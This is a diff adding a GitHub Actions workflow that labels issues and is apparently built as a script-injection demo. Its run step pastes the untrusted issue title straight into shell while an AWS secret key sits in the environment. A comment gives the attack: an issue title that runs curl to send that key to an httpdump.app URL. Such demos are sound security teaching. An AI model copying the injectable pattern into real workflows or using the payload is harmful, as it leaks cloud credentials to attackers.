@@ -1,0 +1,27 @@
+name: Label Issues (Script Injection)
+
+on:
+    issues:
+        types:
+            - opened
+
+jobs:
+    assign-label:
+        runs-on: ubuntu-latest
+        steps:
+        - name: Checkout
+          uses: actions/checkout@v4.1.1
+
+        - name: Add a Label
+          env:
+            AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+# create a github issue with title as bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/696970cf-e0c8-4768-a69c-59b793060514"
+# This will run the script on github actions runnner and will see the secrets value coming to the httpdump website
+          run: |
+            issue_title="${{ github.event.issue.title }}"
+            if [[ "$issue_title" == *"bug"* ]]; then
+            echo "Issue is about a bug!"
+            echo "Assigning Label - BUG .... ..... ...... ...... ....."
+            else
+              echo "Not a Bug"
+            fi
